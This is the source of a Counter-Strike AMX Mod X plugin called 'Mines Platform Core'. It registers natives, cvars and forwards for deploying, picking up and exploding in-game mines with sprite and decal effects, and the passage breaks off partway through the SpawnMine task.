
//=============================================
//	Plugin Writed by Visual Studio Code.
//=============================================
// Supported BIOHAZARD.
// #define BIOHAZARD_SUPPORT

// Supported Zombie Plague.
// #define ZP_SUPPORT

//=====================================
//  INCLUDE AREA
//=====================================
#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <csx>
#include <engine>
#include <fakemeta>
#include <hamsandwich>
#include <mines_common>

#if defined BIOHAZARD_SUPPORT
	#include <biohazard>
#endif

#if defined ZP_SUPPORT
	#include <zombieplague>
	#include <zp50_items>
	#include <zp50_colorchat>
	#include <zp50_ammopacks>
#endif

#pragma semicolon 1

#define PLUGIN 									"Mines Platform Core"
#define CVAR_TAG								"amx_mines"

//=====================================
//  MACRO AREA
//=====================================
//
// String Data.
//

// ADMIN LEVEL
#define ADMIN_ACCESSLEVEL						ADMIN_LEVEL_H

// Put Guage ID
#define TASK_PLANT								315100
#define TASK_RESET								315500
#define TASK_RELEASE							315900

#define INI_FILE								"plugins/mines/mines_resources.ini"

//=====================================
//  Resource Setting AREA
//=====================================
enum L_KEY
{
	L_DEBUG				,
	L_REFER				,
	L_BOUGHT			,
	L_NOT_MONEY			,
	L_NOT_ACCESS		,
	L_NOT_ACTIVE		,
	L_NOT_HAVE			,
	L_NOT_BUY			,
	L_NOT_BUYZONE		,
	L_NOT_PICKUP		,
	L_MAX_DEPLOY		,
	L_MAX_HAVE			,
	L_MAX_PPL			,
	L_DELAY_SEC			,
	L_STATE_AMMO		,
	L_STATE_INF			,
	L_NOROUND			,
	L_ALL_REMOVE		,
	L_GIVE_MINE			,
	L_REMOVE_SPEC		,
	L_MINE_HUD			,
	L_NOT_BUY_TEAM		,
	L_MENU_TITLE		,
	L_SUB_MENU_TITLE	,
	L_MENU_BUY			,
	L_MENU_DEPLOY		,
	L_MENU_PICKUP		,
	L_MENU_EXPLOSION	,
	L_MENU_SELECT		,
};

new const LANG[L_KEY][] =
{
	"DEBUG"				,
	"REFER"				,
	"BOUGHT"			,
	"NOT_MONEY"			,
	"NOT_ACCESS"		,
	"NOT_ACTIVE"		,
	"NOT_HAVE"			,
	"NOT_BUY"			,
	"NOT_BUYZONE"		,
	"NOT_PICKUP"		,
	"MAX_DEPLOY"		,
	"MAX_HAVE"			,
	"MAX_PPL"			,
	"DELAY_SEC"			,
	"STATE_AMMO"		,
	"STATE_INF"			,
	"NO_ROUND"			,
	"ALL_REMOVE"		,
	"TAKE_MINE"			,
	"REMOVE_SPEC"		,
	"MINE_HUD_MSG"		,
	"NOT_BUY_TEAM"		,
	"MENU_TITLE"		,
	"SUBM_TITLE"		,
	"MENU_BUY"			,
	"MENU_DEPLOY"		,
	"MENU_PICKUP"		,
	"MENU_EXPLOSION"	,
	"MENU_SELECTED"		
};


//====================================================
//  Player Data functions.
//====================================================
#define mines_get_user_deploy_state(%1)		gCPlayerData[%1][PL_STATE_DEPLOY]
#define mines_set_user_deploy_state(%1,%2)	gCPlayerData[%1][PL_STATE_DEPLOY] = %2
#define mines_load_user_max_speed(%1)		gCPlayerData[%1][PL_MAX_SPEED]
#define mines_save_user_max_speed(%1,%2)	gCPlayerData[%1][PL_MAX_SPEED] = Float:%2

enum _:FORWARDER
{
	FWD_SET_ENTITY_SPAWN,
	FWD_PUTIN_SERVER,
	FWD_CHECK_DEPLOY,
	FWD_CHECK_PICKUP,
	FWD_CHECK_BUY,
	FWD_DISCONNECTED,
	FWD_MINES_THINK,
	FWD_MINES_BREAKED,
	FWD_MINES_PICKUP,
	FWD_REMOVE_ENTITY,
	FWD_PLUGINS_END,
	FWD_EXPLOSION,
	FWD_HOLOGRAM,
	FWD_OVERRIDE_POS,
};

new Array:gMinesCSXID;
new Array:gMinesClass;
new Array:gPlayerData	[MAX_PLAYERS];
new Array:gMinesLongName;
new Array:gMinesParameter;
new Array:gMinesModels;
new gForwarder			[FORWARDER];
new gCPlayerData		[MAX_PLAYERS][COMMON_PLAYER_DATA];
new gDecalIndexExplosion[MAX_EXPLOSION_DECALS];
new gDecalIndexBlood	[MAX_BLOOD_DECALS];
new gNumDecalsExplosion;
new gNumDecalsBlood;
//====================================================
//  Enum Area.
//====================================================
//
// CVAR SETTINGS
//
enum CVAR_SETTING
{
	CVAR_ENABLE				= 0,    // Plugin Enable.
	CVAR_ACCESS_LEVEL		,		// Access level for 0 = ADMIN or 1 = ALL.
	CVAR_NOROUND			,		// Check Started Round.
	CVAR_CMD_MODE			,    	// 0 = +USE key, 1 = bind, 2 = each.
	CVAR_FRIENDLY_FIRE		,		// Friendly Fire.
	CVAR_START_DELAY        ,   	// Round start delay time.
};

enum CVAR_VALUE
{
	VL_ENABLE				= 0,    // Plugin Enable.
	VL_ACCESS_LEVEL			,		// Access level for 0 = ADMIN or 1 = ALL.
	VL_NOROUND				,		// Check Started Round.
	VL_CMD_MODE				,    	// 0 = +USE key, 1 = bind, 2 = each.
	VL_FRIENDLY_FIRE		,		// Friendly Fire.
	VL_START_DELAY        	,   	// Round start delay time.
	VL_VIOLENCE_HBLOOD		,		// Show Violence blood.
};

//====================================================
//  GLOBAL VARIABLES.
//====================================================
new gMsgBarTime;
new gEntMine;
new gSubMenuCallback;
new gCvar				[CVAR_SETTING];
new gCvarValue			[CVAR_VALUE];
new gSelectedMines		[MAX_PLAYERS];
new gDeployingMines		[MAX_PLAYERS];
new gSprites			[E_SPRITES];

new const ENT_SOUNDS	[E_SOUNDS][]	=	
{
	"items/gunpickup2.wav"		,		// 0: PICKUP
	"items/gunpickup4.wav"		,		// 1: PICKUP (BUTTON)
	"debris/bustglass1.wav"		,		// 2: GLASS
	"debris/bustglass2.wav"				// 3: GLASS
};

new const ENT_SPRITES	[E_SPRITES][]	=
{
	"sprites/fexplo.spr"		,		// 0: EXPLOSION
	"sprites/eexplo.spr"		,		// 1: EXPLOSION
	"sprites/WXplo1.spr"		,		// 2: WATER EXPLOSION
	"sprites/blast.spr"			,		// 3: BLAST
	"sprites/steam1.spr"		,		// 4: SMOKE
	"sprites/bubble.spr"		,		// 5: BUBBLE
	"sprites/blood.spr"			,		// 6: BLOOD SPLASH
	"sprites/bloodspray.spr"			// 7: BLOOD SPRAY
};

// Client Print Command Macro.

stock print_info(const id, const iMinesId = 0, const L_KEY:key, const any:param[] = "")
{
	switch(key)
	{
		case L_DEBUG		:
			client_print_color(id, print_team_red, "^4[Mines Debug] ^1Can't Create Entity");

		case L_REFER		,	
			 L_BOUGHT		,
			 L_NOT_BUY		,
			 L_NOT_BUYZONE	,
			 L_NOT_PICKUP	,
			 L_MAX_DEPLOY	,
			 L_MAX_PPL		,
			 L_NOROUND		:
			client_print_color(id, id, "%L", id, LANG[key], CHAT_TAG);

		case L_NOT_MONEY	,
			 L_NOT_HAVE:
			client_print_color(id, id, "%L", id, LANG[key], CHAT_TAG, get_long_name(id, iMinesId), param[0]);

		case L_NOT_ACCESS	,
			 L_NOT_ACTIVE	:
			client_print_color(id, print_team_red, "%L", id, LANG[key], CHAT_TAG);

		case L_MAX_HAVE		,
			 L_NOT_BUY_TEAM:
			client_print_color(id, id, "%L", id, LANG[key], CHAT_TAG, get_long_name(id, iMinesId));

		case L_DELAY_SEC	,
			 L_REMOVE_SPEC: 
			client_print_color(id, id, "%L", id, LANG[key], CHAT_TAG, param[0]);

		case L_ALL_REMOVE	:
			client_print_color(id, id, "%L", id, LANG[key], CHAT_TAG, param[0], param[1]);

		case L_GIVE_MINE	:
			client_print_color(id, id, "%L", id, LANG[key], CHAT_TAG, id, get_long_name(param[0], iMinesId));
	}
}

//====================================================
//  PLUGIN PRECACHE
//====================================================
public plugin_precache() 
{
	gMinesCSXID						= ArrayCreate();
	gMinesClass 					= ArrayCreate(MAX_CLASS_LENGTH);
	gMinesParameter 				= ArrayCreate(COMMON_MINES_DATA);
	gMinesLongName					= ArrayCreate(MAX_NAME_LENGTH);
	gMinesModels					= ArrayCreate(MAX_MODEL_LENGTH);

	for(new i = 0; i < MAX_PLAYERS; i++)
		gPlayerData[i] = ArrayCreate(PLAYER_DATA);

	for (new i = 0; i < sizeof(ENT_SOUNDS); i++)
		precache_sound(ENT_SOUNDS[i]);

	for (new i = 0; i < sizeof(ENT_SPRITES); i++)
		gSprites[i] = precache_model(ENT_SPRITES[i]);
	
	LoadDecals();

	return PLUGIN_CONTINUE;
}

//====================================================
//  PLUGIN INITIALIZE
//====================================================
public plugin_init()
{
	register_plugin(PLUGIN, VERSION, AUTHOR);
	
	// Add your code here...
	register_concmd("mines_remove", "admin_remove_mines",ADMIN_ACCESSLEVEL, " - <userid>"); 
	register_concmd("mines_give", 	"admin_give_mines",  ADMIN_ACCESSLEVEL, " - <userid> <minesId>"); 

	// Add your code here...
	register_clcmd("+mdeploy",  "mines_cmd_progress_deploy");
   	register_clcmd("-mdeploy",  "mines_cmd_progress_stop");
	register_clcmd("say", 		"say_mines");

	// CVar settings.
	// Common.
	gCvar[CVAR_ENABLE]				= create_cvar(fmt("%s%s", CVAR_TAG, "_enable"),			"1"	);	// 0 = off, 1 = on.
	gCvar[CVAR_ACCESS_LEVEL]		= create_cvar(fmt("%s%s", CVAR_TAG, "_access"),			"0"	);	// 0 = all, 1 = admin
	gCvar[CVAR_START_DELAY]			= create_cvar(fmt("%s%s", CVAR_TAG, "_round_delay"),	"5"	);	// Round start delay time.
	gCvar[CVAR_FRIENDLY_FIRE]		= get_cvar_pointer("mp_friendlyfire");							// Friendly fire. 0 or 1

	gForwarder[FWD_SET_ENTITY_SPAWN]= CreateMultiForward("mines_entity_spawn_settings"	, ET_CONTINUE,	FP_CELL, FP_CELL, FP_CELL);
	gForwarder[FWD_OVERRIDE_POS]	= CreateMultiForward("mines_entity_set_position"	, ET_CONTINUE,	FP_CELL, FP_CELL, FP_CELL);
	gForwarder[FWD_PUTIN_SERVER]	= CreateMultiForward("mines_client_putinserver"		, ET_IGNORE, 	FP_CELL);
	gForwarder[FWD_DISCONNECTED] 	= CreateMultiForward("mines_client_disconnected"	, ET_IGNORE,	FP_CELL);
	gForwarder[FWD_REMOVE_ENTITY]	= CreateMultiForward("mines_remove_entity"			, ET_IGNORE,	FP_CELL);
	gForwarder[FWD_PLUGINS_END] 	= CreateMultiForward("mines_plugin_end"				, ET_IGNORE);
	gForwarder[FWD_CHECK_PICKUP]	= CreateMultiForward("CheckForPickup"				, ET_STOP,  	FP_CELL, FP_CELL, FP_CELL);
	gForwarder[FWD_CHECK_DEPLOY]	= CreateMultiForward("CheckForDeploy"				, ET_STOP,   	FP_CELL, FP_CELL);
	gForwarder[FWD_CHECK_BUY]	 	= CreateMultiForward("CheckForBuy"					, ET_STOP,   	FP_CELL, FP_CELL);
	gForwarder[FWD_MINES_THINK]		= CreateMultiForward("MinesThink"					, ET_IGNORE, 	FP_CELL, FP_CELL);
	gForwarder[FWD_MINES_PICKUP]	= CreateMultiForward("MinesPickup"					, ET_IGNORE, 	FP_CELL, FP_CELL);
	gForwarder[FWD_MINES_BREAKED]	= CreateMultiForward("MinesBreaked"					, ET_IGNORE, 	FP_CELL, FP_CELL, FP_CELL);

	// Get Message Id
	gMsgBarTime						= get_user_msgid("BarTime");
	gSubMenuCallback				= menu_makecallback("mines_submenu_callback");

	bind_pcvar_num(gCvar[CVAR_ENABLE], 			gCvarValue[VL_ENABLE]);
	bind_pcvar_num(gCvar[CVAR_ACCESS_LEVEL],	gCvarValue[VL_ACCESS_LEVEL]);
	bind_pcvar_num(gCvar[CVAR_START_DELAY], 	gCvarValue[VL_START_DELAY]);
	bind_pcvar_num(gCvar[CVAR_FRIENDLY_FIRE], 	gCvarValue[VL_FRIENDLY_FIRE]);
	bind_pcvar_num(get_cvar_pointer("violence_hblood"), gCvarValue[VL_VIOLENCE_HBLOOD]);

	// Register Event
#if AMXX_VERSION_NUM > 182	
	register_event_ex("DeathMsg", "DeathEvent",		RegisterEvent_Global);
	register_event_ex("TeamInfo", "CheckSpectator",	RegisterEvent_Global);
#else
	register_event("DeathMsg", "DeathEvent",		"a");
	register_event("TeamInfo", "CheckSpectator",	"a");
#endif
	// Register Forward.
	register_forward(FM_TraceLine,		"MinesShowInfo", 1);

	// Register Hamsandwich
	RegisterHam(Ham_Spawn, 		"player", 			 "NewRound", 		1);
	RegisterHam(Ham_TakeDamage, "player", 			 "PlayerKilling", 	0);
	RegisterHam(Ham_Think, 		ENT_CLASS_BREAKABLE, "MinesThinkMain",	0);
	RegisterHam(Ham_TakeDamage,	ENT_CLASS_BREAKABLE, "MinesTakeDamage", 0);
	RegisterHam(Ham_TakeDamage,	ENT_CLASS_BREAKABLE, "MinesTakeDamaged",1);

	// Register Forward.
	register_forward(FM_CmdStart,		"PlayerCmdStart");

	// Multi Language Dictionary.
	register_dictionary("mines/mines_core.txt");

	create_cvar("mines_platform_core", VERSION, FCVAR_SERVER|FCVAR_SPONLY);
#if AMXX_VERSION_NUM > 182
	AutoExecConfig(true, "mines_cvars_core", "mines");
#endif
	check_plugin();

	return PLUGIN_CONTINUE;
}

//====================================================
//  PLUGIN CONFIG
//====================================================
public plugin_cfg()
{
	// registered func_breakable
	gEntMine = engfunc(EngFunc_AllocString, ENT_CLASS_BREAKABLE);

#if AMXX_VERSION_NUM < 190
	new file[128];
	new len = charsmax(file);
	get_localinfo("amxx_configsdir", file, len);
	formatex(file, len, "%s/plugins/mines/mines_cvars_core.cfg", file);

	if(file_exists(file)) 
	{
		server_cmd("exec %s", file);
		server_exec();
	}
#endif
}
//====================================================
//  PLUGIN END
//====================================================
public plugin_end()
{
	// Forward Plugin End Function.
	new iReturn;
	ExecuteForward(gForwarder[FWD_PLUGINS_END], iReturn);

	// Destroy Fowards
	for (new i = 0; i < FORWARDER; i++)
		DestroyForward(gForwarder[i]);

	// Destroy Arrays
	ArrayDestroy(gMinesClass);
	ArrayDestroy(gMinesParameter);
	ArrayDestroy(gMinesLongName);
	ArrayDestroy(gMinesModels);

	for (new i = 0; i < MAX_PLAYERS; i++)
		ArrayDestroy(gPlayerData[i]);
}

//====================================================
//  PLUGIN NATIVES
//====================================================
public plugin_natives()
{
	register_library("mines_natives");

	register_native("register_mines",					"_native_register_mines");
	register_native("register_mines_data",				"_native_register_mines_data");
	register_native("mines_get_csx_weapon_id",			"_native_get_csx_weapon_id");
	register_native("mines_progress_deploy",			"_native_deploy_progress");
	register_native("mines_progress_pickup",			"_native_pickup_progress");
	register_native("mines_progress_stop", 				"_native_stop_progress");
	register_native("mines_explosion", 					"_native_mines_explosion");
	register_native("mines_buy",						"_native_buy_mines");
	register_native("mines_valid_takedamage",			"_native_is_valid_takedamage");
	register_native("mines_register_dictionary",		"_native_register_dictionary");
	register_native("mines_resources", 					"_native_read_ini_resources");
	register_native("mines_create_explosion",			"_native_create_explosion");
	register_native("mines_create_smoke",				"_native_create_smoke");
	register_native("mines_create_explosion_decals", 	"_native_create_explosion_decals");
	register_native("mines_create_bubbles",				"_native_create_bubbles");
	register_native("mines_create_hblood",				"_native_create_hblood");

#if defined ZP_SUPPORT
	register_native("zp_give_lm", 						"ZpMinesNative");
#endif
}

public _native_get_csx_weapon_id(iPlugin, iParams)
{
	new iMinesId 	= get_param(1);
	new csx_wpnid 	= ArrayGetCell(gMinesCSXID, iMinesId); 
	return csx_wpnid;
}
//====================================================
//  Native Functions
//====================================================
// Register Mines.
public _native_register_mines(iPlugin, iParams)
{
	new className	[MAX_CLASS_LENGTH];
	new sLongName	[MAX_NAME_LENGTH];
	new minesData	[COMMON_MINES_DATA];
	new minesModel	[MAX_MODEL_LENGTH];
	new plData		[PLAYER_DATA];
	new iMinesId = -1;

	get_string	(1, className, charsmax(className));
	get_string	(2, sLongName, charsmax(sLongName));

	// register mines classname/parameter/longname key
	iMinesId = ArrayPushString(gMinesClass, className);
	// Add Custom weapon id to CSX.
	ArrayPushCell	(gMinesCSXID,		custom_weapon_add(sLongName, 0, className));

	ArrayPushString	(gMinesLongName, 	sLongName);
	ArrayPushArray	(gMinesParameter, 	minesData);
	ArrayPushString (gMinesModels, 		minesModel);
	// initialize player data.
	for(new i = 0; i < MAX_PLAYERS; i++)
		ArrayPushArray(gPlayerData[i], plData);


	return iMinesId;
}
public _native_register_mines_data(iPlugin, iParams)
{
	new minesData	[COMMON_MINES_DATA];
	new iMinesId = get_param(1);
	new minesModel	[MAX_MODEL_LENGTH];

	ArrayGetArray	(gMinesParameter,	iMinesId, minesData);
	get_array		(2, minesData, 		COMMON_MINES_DATA);
	ArraySetArray	(gMinesParameter,	iMinesId, minesData);
	get_string		(3, minesModel,		charsmax(minesModel));
	ArraySetString	(gMinesModels,		iMinesId, minesModel);

	#if defined ZP_SUPPORT
		new zpWeaponId					= zp_items_register(className, minesData[BUY_PRICE]);
		gZpGameMode[GMODE_ARMAGEDDON]	= zp_gamemodes_get_id("Armageddon Mode");
		gZpGameMode[GMODE_ZTAG] 		= zp_gamemodes_get_id("Zombie Tag Mode");
		gZpGameMode[GMODE_ASSASIN]		= zp_gamemodes_get_id("Assassin Mode");
		minesData[ZP_WEAPON_ID]			= zpWeaponId;
	#endif

}

// Register Dictionary
public _native_register_dictionary(iPlugin, iParams)
{
	new sDictionary[64];
	get_string(1, sDictionary, charsmax(sDictionary));
	register_dictionary(sDictionary);
}

// is valid Take Damage.
public _native_is_valid_takedamage(iPlugin, iParams) 
{
	return is_valid_takedamage(get_param(1), get_param(2));
}

// mines_progress_deploy(id, iMinesId);
public _native_deploy_progress(iPlugin, iParams)
{
	_mines_progress_deploy(get_param(1), get_param(2));
}

// mines_progress_pickup(id, iMinesId);
public _native_pickup_progress(iPlugin, iParams)
{
	_mines_progress_pickup(get_param(1), get_param(2));
}

// mines_progress_stop(id);
public _native_stop_progress(iPlugin, iParams)
{
	_mines_progress_stop(get_param(1));
}

// Buy mines.
public _native_buy_mines(iPlugin, iParams)
{	
#if !defined ZP_SUPPORT
	mines_buy_mine(get_param(1), get_param(2));
#endif
	return PLUGIN_HANDLED;
}

// mines_mines_explosion(id, iMinesId, iEnt);
public _native_mines_explosion(iPlugin, iParams)
{
	new id		 = get_param(1);
	new iMinesId = get_param(2);
	new iEnt	 = get_param(3); 

	static plData[PLAYER_DATA];
	static minesData[COMMON_MINES_DATA];

	// Stopping entity to think
	set_pev(iEnt, pev_nextthink, 0.0);

	// reset deploy count.
	// Count down. deployed lasermines.
	ArrayGetArray(gPlayerData[id], iMinesId, plData);
	plData[PL_COUNT_DEPLOYED]--;
	ArrayGetArray(gPlayerData[id], iMinesId, plData);
	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	static sprBoom1;
	static sprBoom2;
	static sprBlast;
	static sprSmoke;
	static sprWater;
	static sprBubble;

	static Float:vOrigin[3];
	static Float:vDecals[3];

	pev(iEnt, pev_origin, 	vOrigin);
	CED_GetArray(iEnt, MINES_DECALS, vDecals, sizeof(vDecals));

	sprBoom1 = (minesData[EXPLODE_SPRITE1]) 	 ? minesData[EXPLODE_SPRITE1]		: gSprites[SPR_EXPLOSION_1];
	sprBoom2 = (minesData[EXPLODE_SPRITE2]) 	 ? minesData[EXPLODE_SPRITE2]		: gSprites[SPR_EXPLOSION_2];
	sprBlast = (minesData[EXPLODE_SPRITE_BLAST]) ? minesData[EXPLODE_SPRITE_BLAST]  : gSprites[SPR_BLAST];
	sprSmoke = (minesData[EXPLODE_SPRITE_SMOKE]) ? minesData[EXPLODE_SPRITE_SMOKE]  : gSprites[SPR_SMOKE];
	sprWater = (minesData[EXPLODE_SPRITE_WATER]) ? minesData[EXPLODE_SPRITE_WATER]  : gSprites[SPR_EXPLOSION_WATER];
	sprBubble= (minesData[EXPLODE_SPRITE_BUBBLE])? minesData[EXPLODE_SPRITE_BUBBLE] : gSprites[SPR_BUBBLE];

	if(engfunc(EngFunc_PointContents, vOrigin) != CONTENTS_WATER) 
	{
		mines_create_explosion	(vOrigin, Float:minesData[EXPLODE_DAMAGE], Float:minesData[EXPLODE_RADIUS], sprBoom1, sprBoom2, sprBlast);
		mines_create_smoke		(vOrigin, Float:minesData[EXPLODE_DAMAGE], Float:minesData[EXPLODE_RADIUS], sprSmoke);
	}
	else 
	{
		mines_create_water_explosion(vOrigin, Float:minesData[EXPLODE_DAMAGE], Float:minesData[EXPLODE_RADIUS], sprWater);
		mines_create_bubbles		(vOrigin, Float:minesData[EXPLODE_DAMAGE] * 1.0, Float:minesData[EXPLODE_RADIUS] * 1.0, sprBubble);
	}
	// decals
	mines_create_explosion_decals(vDecals);

	// damage.
	new csx_id = ArrayGetCell(gMinesCSXID, iMinesId);
	mines_create_explosion_damage(csx_id, iEnt, id, Float:minesData[EXPLODE_DAMAGE], Float:minesData[EXPLODE_RADIUS]);

	// remove this.
	mines_remove_entity(iEnt);
}

// mines_resources(iMinesId, key[], value[], size, def[]);
public _native_read_ini_resources(iPlugin, iParams)
{
	new iMinesId = get_param(1);
	new sKey[32];
	new sDef[32];
	new value[64];

	get_string(2, sKey, charsmax(sKey));
	get_string(5, sDef, charsmax(sDef));

	new sClassName[MAX_CLASS_LENGTH];
	ArrayGetString(gMinesClass, iMinesId, sClassName, charsmax(sClassName));

	new result = ini_read_string(INI_FILE, sClassName, sKey, value, charsmax(value));

	if (result <= 0)
		formatex(value, charsmax(value), "%s", sDef);

	set_string(3, value, get_param(4));
	return result;
}

public _native_create_explosion(iPlugin, iParams)
{
	new Float:vOrigin[3];
	get_array_f(1, vOrigin, sizeof(vOrigin));

	new Float:fDamage 	= get_param_f(2);
	new Float:fRadius   = get_param_f(3);
	new sprExplosion1   = get_param(4);
	new sprExplosion2 	= get_param(5);
	new sprBlast	  	= get_param(6);

	mines_create_explosion(vOrigin, fDamage, fRadius, sprExplosion1, sprExplosion2, sprBlast);
}

public _native_create_smoke(iPlugin, iParams)
{
	new Float:vOrigin[3];
	get_array_f(1, vOrigin, sizeof(vOrigin));

	new Float:fDamage = get_param_f(2);
	new Float:fRadius = get_param_f(3);
	new sprSmoke 	  = get_param(4);

	mines_create_smoke(vOrigin, fDamage, fRadius, sprSmoke);
}

public _native_create_explosion_decals(iPlugin, iParams)
{
	new Float:vOrigin[3];
	get_array_f(1, vOrigin, sizeof(vOrigin));

	mines_create_explosion_decals(vOrigin);
}

public _native_create_bubbles(iPlugin, iParams)
{
	new Float:vOrigin[3];
	get_array_f(1, vOrigin, sizeof(vOrigin));

	new Float:flDamageMax 		= get_param_f(2);
	new Float:flDamageRadius 	= get_param_f(3);
	new sprBubbles				= get_param(4);

	mines_create_bubbles(vOrigin, flDamageMax, flDamageRadius, sprBubbles);
}

public _native_create_hblood(iPlugin, iParams)
{
	new Float:vOrigin[3];
	get_array_f(1, vOrigin, sizeof(vOrigin));

	new iDamageMax		= get_param(2);
	new sprBloodSpray 	= get_param(3);
	new sprBlood 		= get_param(4);

	sprBloodSpray 		= sprBloodSpray	? sprBloodSpray : gSprites[SPR_BLOOD_SPLASH];
	sprBlood	  		= sprBlood		? sprBlood		: gSprites[SPR_BLOOD_SPRAY];

	mines_create_hblood(vOrigin, iDamageMax, sprBloodSpray, sprBlood);
}
// //====================================================
// //  Bot Register Ham.
// //====================================================
// new g_bots_registered = false;
// public client_authorized( id )
// {
// 	if( !g_bots_registered && is_user_bot( id ) )
// 	{
// #if AMXX_VERSION_NUM > 182
// 		set_task_ex( 0.1, "register_bots", id );
// #else
// 		set_task( 0.1, "register_bots", id );
// #endif
// 	}
// }

// public register_bots( id )
// {
// 	if( !g_bots_registered && is_user_connected( id ) )
// 	{
// 		RegisterHamFromEntity(Ham_Killed, id, "PlayerKilling");
// 		g_bots_registered = true;
// 	}
// }

//====================================================
// Friendly Fire Method.
//====================================================
bool:is_valid_takedamage(iAttacker, iTarget)
{
	if (gCvarValue[VL_FRIENDLY_FIRE])
		return true;

	if (is_user_connected(iAttacker) && is_user_connected(iTarget))
	{
		if (cs_get_user_team(iAttacker) != cs_get_user_team(iTarget))
			return true;
	}

	return false;
}

//====================================================
// Round Start Initialize
//====================================================
public NewRound(id)
{
	// Check Plugin Enabled
	if (!gCvarValue[VL_ENABLE])
		return PLUGIN_CONTINUE;

	if (!is_user_connected(id))
		return PLUGIN_CONTINUE;
	
	if (is_user_bot(id))
		return PLUGIN_CONTINUE;

	// alive?
	if (is_user_alive(id) && pev(id, pev_flags) & (FL_CLIENT)) 
	{
		// Task Delete.
		delete_task(id);

		new plData[PLAYER_DATA];
		for (new i = 0; i < ArraySize(gMinesClass); i++)
		{
			ArrayGetArray(gPlayerData[id], i, plData);
			// Delay time reset
			plData[PL_COUNT_DELAY] = int:floatround(get_gametime());
			ArrayGetArray(gPlayerData[id], i, plData);
			// Removing already put mines.
			mines_remove_all_entity_main(id, i);
			// Round start set ammo.
			set_start_ammo(id, i);
		}
	}
	return PLUGIN_CONTINUE;
}

//====================================================
// Client Commands
//====================================================
public mines_cmd_progress_deploy(id)
{
	_mines_progress_deploy(id, gSelectedMines[id]);
	return PLUGIN_HANDLED;
}
public mines_cmd_progress_pickup(id)
{
	_mines_progress_pickup(id, gSelectedMines[id]);
	return PLUGIN_HANDLED;
}
public mines_cmd_progress_stop(id)
{
	_mines_progress_stop(id);
	return PLUGIN_HANDLED;
}

//====================================================
// Round Start Set Ammo.
// Native:_native_set_start_ammo(iPlugin, iParam);
//====================================================
set_start_ammo(id, iMinesId)
{
	static plData[PLAYER_DATA];
	static minesData[COMMON_MINES_DATA];
	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	// Get CVAR setting.
	new int:stammo = int:minesData[AMMO_HAVE_START];

	// Zero check.
	if(stammo <= int:0) 
		return;

	ArrayGetArray(gPlayerData[id], iMinesId, plData);

	// Getting have ammo.
	new int:haveammo = plData[PL_COUNT_HAVE_MINE];

	// Set largest.
	plData[PL_COUNT_HAVE_MINE] = (haveammo <= stammo ? stammo : haveammo);
	ArraySetArray(gPlayerData[id], iMinesId, plData);

	return;
}

//====================================================
// Death Event / Delete Task.
//====================================================
public DeathEvent()
{
	new vID = read_data(2); // victim

	// Check Plugin Enabled
	if (!gCvarValue[VL_ENABLE])
		return PLUGIN_CONTINUE;

	// Is Connected?
	if (is_user_connected(vID)) 
		delete_task(vID);

	mines_remove_all_mines(vID);

	return PLUGIN_CONTINUE;
}

//====================================================
// Put mines Start Progress A
//====================================================
public _mines_progress_deploy(id, iMinesId)
{
	// Deploying Check.
	if (!CheckDeploy(id, iMinesId))
		return PLUGIN_HANDLED;

	static minesData[COMMON_MINES_DATA];
	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	new Float:wait = Float:minesData[ACTIVATE_TIME];

	if (gDeployingMines[id] == 0 || !pev_valid(gDeployingMines[id]))
	{
		new iEnt = gDeployingMines[id] = engfunc(EngFunc_CreateNamedEntity, gEntMine);
		// client_print(id, print_chat, "ENTITY ID: %d, USER ID: %d", iEnt, id);

		if (pev_valid(iEnt) && !IsPlayer(iEnt))
		{
			new models[MAX_MODEL_LENGTH];
			new sClassName[MAX_CLASS_LENGTH];

			ArrayGetString(gMinesClass, 	iMinesId, sClassName, 	charsmax(sClassName));
			ArrayGetString(gMinesModels, 	iMinesId, models, 		charsmax(models));

			// set classname.
			set_pev(iEnt, pev_classname, 	sClassName);
			// set models.
			engfunc(EngFunc_SetModel, 		iEnt, models);
			// set solid.
			set_pev(iEnt, pev_solid, 		SOLID_NOT);
			// set movetype.
			set_pev(iEnt, pev_movetype, 	MOVETYPE_FLY);

			set_pev(iEnt, pev_renderfx, 	kRenderFxHologram);
			set_pev(iEnt, pev_body, 		3);
			set_pev(iEnt, pev_sequence, 	TRIPMINE_WORLD);
			set_pev(iEnt, pev_rendermode,	kRenderTransAdd);
			set_pev(iEnt, pev_renderfx,	 	kRenderFxHologram);
			set_pev(iEnt, pev_renderamt,	255.0);
			set_pev(iEnt, pev_rendercolor,	{255.0,255.0,255.0});
			// Set Flag. start progress.
			mines_set_user_deploy_state(id, int:STATE_DEPLOYING);
		}
		if (wait > 0)
			mines_show_progress(id, int:floatround(wait), gMsgBarTime);

		new sMineId[4];
		num_to_str(iMinesId, sMineId, charsmax(sMineId));
		// Start Task. Put mines.
		set_task(wait, "SpawnMine", (TASK_PLANT + id), sMineId, sizeof(sMineId));
	}
	else
		_mines_progress_stop(id);

	return PLUGIN_HANDLED;
}

//====================================================
// Removing target put mines.
//====================================================
public _mines_progress_pickup(id, iMinesId)
{
	// Removing Check.
	if (!CheckPickup(id, iMinesId))
		return PLUGIN_HANDLED;

	static minesData[COMMON_MINES_DATA];
	ArrayGetArray(gMinesParameter, iMinesId, minesData);

	new Float:wait = Float:minesData[ACTIVATE_TIME];
	if (wait > 0)
		mines_show_progress(id, int:floatround(wait), gMsgBarTime);

	// Set Flag. start progress.
	mines_set_user_deploy_state(id, int:STATE_PICKING);

	new sMineId[4];
	num_to_str(iMinesId, sMineId, charsmax(sMineId));
	// Start Task. Remove mines.
	set_task(wait, "RemoveMine", (TASK_RELEASE + id), sMineId, charsmax(sMineId));

	return PLUGIN_HANDLED;
}

//====================================================
// Stopping Progress.
//====================================================
public _mines_progress_stop(id)
{
	if (pev_valid(gDeployingMines[id]))
		mines_remove_entity(gDeployingMines[id]);
	gDeployingMines[id] = 0;

	mines_hide_progress(id, gMsgBarTime);
	delete_task(id);

	return PLUGIN_HANDLED;
}

//====================================================
// Task: Spawn mines.
//====================================================
public SpawnMine(params[], id)
{
	// Task Number to uID.
	new uID = id - TASK_PLANT;
	// Create Entity.
	new plData[PLAYER_DATA];

	// is Valid?
	new iMinesId = str_to_num(params);
	new iEnt	 = gDeployingMines[uID];
	if(!pev_valid(iEnt) || IsPlayer(iEnt))
	{
		print_info(uID, iMinesId, L_DEBUG);
		return PLUGIN_HANDLED_MAIN;
	}

	new iReturn;
	// client_print(id, print_chat, "ENTITY ID: %d, USER ID: %d", iEnt, id);

